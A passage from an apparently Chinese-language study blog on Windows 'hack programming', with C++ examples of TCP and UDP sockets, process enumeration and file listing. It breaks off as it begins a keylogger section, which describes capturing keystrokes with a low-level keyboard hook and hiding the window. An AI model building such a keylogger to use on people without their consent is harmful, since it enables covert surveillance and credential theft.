<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端套接字</span></span><br><span class="line">SOCKET ClientSkt;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc_recv</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> message[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//接收信息</span></span><br><span class="line">		<span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line">		out = recv((SOCKET)lpParam, message, MAX_PATH, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (out &lt;= <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		message[out] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;recv from server:%s\n&quot;</span>, message);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyConnection</span><span class="params">(LPCSTR serverIP, <span class="keyword">int</span> serverPort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//WSAStartup初始化</span></span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	<span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//socket 创建套接字</span></span><br><span class="line"></span><br><span class="line">	ClientSkt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (ClientSkt == INVALID_SOCKET)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;socket Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//配置服务器信息</span></span><br><span class="line">	sockaddr_in server_addr;</span><br><span class="line">	server_addr.sin_family = AF_INET;</span><br><span class="line">	server_addr.sin_port = htons(serverPort);</span><br><span class="line">	server_addr.sin_addr.S_un.S_addr = inet_addr(serverIP);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//连接到服务端</span></span><br><span class="line">	<span class="keyword">if</span> (connect(ClientSkt, (<span class="keyword">const</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;connect Failed!!! %d&quot;</span>, WSAGetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc_recv,(LPVOID)ClientSkt, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPCSTR mysIP = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> myPort = <span class="number">12345</span>;</span><br><span class="line">	<span class="keyword">if</span> (MyConnection(mysIP, myPort))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Connection success!!!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buffer[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		gets_s(buffer, <span class="number">20</span>);</span><br><span class="line">		send(ClientSkt, buffer, (<span class="number">1</span> + <span class="built_in">strlen</span>(buffer)), <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就在我以为万事大吉的时候，编译出来的程序一直互相无法通讯，焯，接下来就是找问题时间，在经过2个小时的努力后，终于调试发现套接字莫名奇妙会变0，造成的原因是在函数内部重新定义了全局变量。。。也是长个教训。</p>
<p>最后还是实现了成功通讯，下面看看效果，先打开服务端等待连接，在打开。<br><img src="https://s2.loli.net/2022/01/15/sKm6JIlwcohQFtn.png"></p>
<h2 id="Socket-UDP"><a href="#Socket-UDP" class="headerlink" title="Socket-UDP"></a>Socket-UDP</h2><p>UDP面向文件传输数据，不能保证可靠传输，可能丢包，并且相对于TCP，没有那么安全，但相对的UPD更加快速，方便，且是一种无连接传输方式，支持一对一，一对多，多对多。</p>
<p>Socket-UDP的通信实现起来比TCP简单一些，只是需要改变socket创建套接字的第二个参数为SOCK_DGRAM，也就是代表UDP，然后就是需要绑定两个不同的服务器，进行互相通信。</p>
<p>主要的流程是WSAStartup 进行初始化–&gt; socket 创建套接字–&gt; bind 绑定。sendto函数需要加入发送目标的ip的端口信息。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line">SOCKET SktUDP;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MySendMessage</span><span class="params">(LPCSTR sIP, <span class="keyword">int</span> iPort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> message[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(message, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));</span><br><span class="line"></span><br><span class="line">	addr.sin_family = AF_INET;</span><br><span class="line">	addr.sin_port = htons(iPort);</span><br><span class="line">	addr.sin_addr.S_un.S_addr = inet_addr(sIP);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">	<span class="comment">//输入信息，发送信息</span></span><br><span class="line">	gets_s(message, MAX_PATH);</span><br><span class="line">	out = sendto(SktUDP, message, MAX_PATH, <span class="number">0</span>, (sockaddr*)&amp;addr, addr_len);</span><br><span class="line">	<span class="keyword">if</span> (out == SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, WSAGetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc_recvform</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//接受连接请求</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> message[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">		<span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memset</span>(message, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));</span><br><span class="line">		<span class="comment">//接收信息</span></span><br><span class="line">		out = recvfrom(SktUDP, message, MAX_PATH, <span class="number">0</span>,(sockaddr *)&amp;addr, &amp;addr_len);</span><br><span class="line">		<span class="keyword">if</span> (out &lt;= <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;recv from :%s\n&quot;</span>, message);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MySktUDP</span><span class="params">(LPCSTR sIP, <span class="keyword">int</span> iPort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//WSAStartup初始化</span></span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	<span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//socket 创建套接字</span></span><br><span class="line">	SktUDP = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (SktUDP == INVALID_SOCKET)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;socket Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//配置服务器信息</span></span><br><span class="line">	sockaddr_in server_addr;</span><br><span class="line">	server_addr.sin_family = AF_INET;</span><br><span class="line">	server_addr.sin_port = htons(iPort);</span><br><span class="line">	server_addr.sin_addr.S_un.S_addr = inet_addr(sIP);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//绑定服务器</span></span><br><span class="line">	<span class="keyword">if</span> (bind(SktUDP, (<span class="keyword">const</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;bind Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建线程来接收消息</span></span><br><span class="line">	CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc_recvform, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> sIP[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> iPort = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Input IP and Port:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, sIP, &amp;iPort);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">if</span> (MySktUDP(sIP, iPort))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;bind success!!!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Input Dest IP and Dest Port:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, sIP, &amp;iPort);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		MySendMessage(sIP, iPort);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意点是输入ip和端口后，需要一个getchar()。</p>
<p>同样可以使用netstat -an，去查看本地端口情况。</p>
<p>下面看看效果<br><img src="https://s2.loli.net/2022/01/19/qwLocU9KgZBDhaA.png"></p>
<h2 id="功能技术"><a href="#功能技术" class="headerlink" title="功能技术"></a>功能技术</h2><h3 id="进程遍历"><a href="#进程遍历" class="headerlink" title="进程遍历"></a>进程遍历</h3><p>很常见的代码，之前APC也写过线程遍历的代码。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">FindAllProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//存储进程信息的</span></span><br><span class="line">	PROCESSENTRY32 pe32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	HANDLE hp32nasp;</span><br><span class="line"></span><br><span class="line">	hp32nasp=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(Process32First(hp32nasp, &amp;pe32)==FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Process32First Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ProcessId = %d\n&quot;</span>, pe32.th32ProcessID);</span><br><span class="line">		<span class="comment">//进程名为Unicode编码，所以用_tprintf</span></span><br><span class="line">		_tprintf(<span class="string">L&quot;ProcessName: %s\n&quot;</span>, pe32.szExeFile);</span><br><span class="line">	&#125;<span class="keyword">while</span> (Process32Next(hp32nasp, &amp;pe32));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FindAllProcess();</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意下进程名是宽字符就行了。</p>
<h3 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h3><p>之前在分析《恶代》的一个lab见到过，当时也是根据伪代码去写了下。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)<span class="comment">//可以使用strcm等函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListFiles</span><span class="params">(<span class="keyword">char</span> *dir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hFind;</span><br><span class="line">    WIN32_FIND_DATAA findData = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    LARGE_INTEGER size;</span><br><span class="line">    <span class="keyword">char</span> dirNew[MAX_PATH];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向目录加通配符，用于搜索第一个文件 </span></span><br><span class="line">    <span class="built_in">sprintf</span>(dirNew, <span class="string">&quot;%s\\*.*&quot;</span>, dir);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    hFind = FindFirstFileA(dirNew, &amp;findData);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 是否是文件夹，</span></span><br><span class="line">        <span class="keyword">if</span> (findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//并且名称不为&quot;.&quot;或&quot;..&quot;  ,因为每个文件夹都有当前目录，和上一层目录。</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(findData.cFileName, <span class="string">&quot;.&quot;</span>) != <span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(findData.cFileName, <span class="string">&quot;..&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 将dirNew1设置为搜索到的目录，并进行下一轮搜索 </span></span><br><span class="line">                <span class="keyword">char</span> dirNew1[MAX_PATH];</span><br><span class="line">                <span class="built_in">sprintf</span>(dirNew1, <span class="string">&quot;%s\\%s&quot;</span>, dir, findData.cFileName);</span><br><span class="line">                ListFiles(dirNew1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//不是文件目录，打印文件绝对路径</span></span><br><span class="line">            <span class="built_in">sprintf</span>(dirNew, <span class="string">&quot;%s\\%s&quot;</span>,dir,findData.cFileName);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, dirNew);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FindNextFileA(hFind, &amp;findData));</span><br><span class="line"></span><br><span class="line">    FindClose(hFind);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>  dir[<span class="number">100</span>] = <span class="string">&quot;D:\\learning record\\学术报告\\Windows-Hack-Programming&quot;</span>;</span><br><span class="line"></span><br><span class="line">    ListFiles(dir);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="按键记录"><a href="#按键记录" class="headerlink" title="按键记录"></a>按键记录</h3><p>按键记录其实可以分很多种，dll注入的全局钩取，但是那种比较有缺陷，需要64位和32位的都全部钩取，不然会造成某些应用程序卡住。然后就是使用windows自带的Hook函数SetWindowsHookExA，将第一个参数设置为WH_KEYBOARD_LL，就能钩取键盘消息了，也是Lab-3-3的一个例子，感觉比书中的简单一些。然后就是书上的这种了，</p>
<p>SetWindowsHookExA实现，随便隐藏了下窗口，也要感谢书中提供的虚拟键值的替换表，还不错，省了很多功夫。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 